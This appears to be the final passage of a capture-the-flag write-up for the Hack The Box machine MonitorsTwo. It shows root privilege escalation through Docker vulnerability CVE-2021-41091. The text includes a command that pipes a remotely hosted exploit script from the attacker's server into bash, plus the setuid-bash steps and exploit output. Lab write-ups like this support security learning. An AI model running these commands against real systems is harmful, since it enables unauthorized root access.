[Docker : Security vulnerabilities](https://www.cvedetails.com/vulnerability-list/vendor_id-13534/Docker.html?ref=secjuice.com)

The **docker version** available on the machine could help me identify a specific exploit.

    marcus@monitorstwo:~$ docker --version
    Docker version 20.10.5+dfsg1, build 55c4c88
    

I download the results for an easier search (fortunately it's only two pages). I import the data into an **excel** file and perform a quick search based on the docker version in the BOX. Three results come out.

The **CVE-2021-41092** (_execution vulnerability_), **CVE-2021-21285** (_unknown_) and **CVE-2021-21284** (_Traversal path vulnerability_).

The **CVE-2021-41092** inspires me, it allows the execution of commands following a login to a personal docker registry, I look for some exploits, but I can't find anything useful and even by approaching some personal experiments, I get nothing.  
**CVE-2021-21285** doesn't really work for me, causing the docker daemon to crash when pulling an image (which I can't do due to a lack of permissions, among other things). The **CVE-2021-21284** remains for which I can't find anything as interesting as the previous ones. After a while, I search online for some other _exploits_ on the specific version (_Docker 20.10.5 exploit_) and among the first results there is an interesting git repository.

[GitHub - UncleJ4ck/CVE-2021-41091: POC for CVE-2021-41091](https://github.com/UncleJ4ck/CVE-2021-41091?ref=secjuice.com)

The exploit is not on the docker **CLI**, but on the **docker engine** itself (the **Moby**). Taking a look at the script and executing some commands from the BOX's shell to understand if the vulnerability is actually present, I don't get excellent results, but trying doesn't cost anything anyway, so I download the script on my machine and then execute it, as always, without a trace!

    ┌──(in7rud3r㉿kali-muletto)-[~/…/hackthebox/_10.10.11.211 - MonitorsTwo (lin)/attack/upld]
    └─$ wget https://raw.githubusercontent.com/UncleJ4ck/CVE-2021-41091/main/exp.sh                
    --2023-05-20 06:09:32--  https://raw.githubusercontent.com/UncleJ4ck/CVE-2021-41091/main/exp.sh
    Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.111.133, 185.199.108.133, 185.199.109.133, ...
    Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.111.133|:443... connected.
    HTTP request sent, awaiting response... 200 OK
    Length: 2446 (2.4K) [text/plain]
    Saving to: ‘exp.sh’
    
    exp.sh                                             100%[=============================================================================================================>]   2.39K  --.-KB/s    in 0.002s  
    
    2023-05-20 06:09:32 (1.03 MB/s) - ‘exp.sh’ saved [2446/2446]
    
                                                                                                                                                                                                             
    ┌──(in7rud3r㉿kali-muletto)-[~/…/hackthebox/_10.10.11.211 - MonitorsTwo (lin)/attack/upld]
    └─$ php -S 10.10.14.78:80
    [Sat May 20 06:09:35 2023] PHP 8.2.4 Development Server (http://10.10.14.78:80) started
    

Ready!

    marcus@monitorstwo:/tmp$ bash <(curl -s http://10.10.14.78/exp.sh)
    [!] Vulnerable to CVE-2021-41091
    [!] Now connect to your Docker container that is accessible and obtain root access !
    [>] After gaining root access execute this command (chmod u+s /bin/bash)
    
    Did you correctly set the setuid bit on /bin/bash in the Docker container? (yes/no): yes
    [!] Available Overlay2 Filesystems:
    /var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged
    /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
    
    [!] Iterating over the available Overlay2 filesystems !
    [?] Checking path: /var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged
    [x] Could not get root access in '/var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged'
    
    [?] Checking path: /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
    [!] Rooted !
    [>] Current Vulnerable Path: /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
    [?] If it didn't spawn a shell go to this path and execute './bin/bash -p'
    
    [!] Spawning Shell
    bash-5.1# exit
    marcus@monitorstwo:/tmp$ cd /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
    marcus@monitorstwo:/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged$ ./bin/bash -p
    bash-5.1# whoami
    root
    bash-5.1# ls -la /root/root.txt
    -rw-r----- 1 root root 33 May 20 02:50 /root/root.txt
    bash-5.1# cat /root/root.txt
    6******************************6

Woooo, what a fantastic surprise, even if from the preliminary tests it didn't seem feasible to me. Anyway, another interesting BOX indeed. As always, while waiting for another machine, have good hacking. That's all folks.

## Help Support Our Non-Profit Mission

If you enjoyed this article or found it helpful please consider making a **U.S. tax-deductible** donation, Secjuice is a non-profit and volunteer-based publication powered by donations. We will use your donation to help cover our hosting costs and **keep Secjuice an advertisement and sponsor free zone**.

[Make a tax-deductible donation](https://opencollective.com/secjuice)
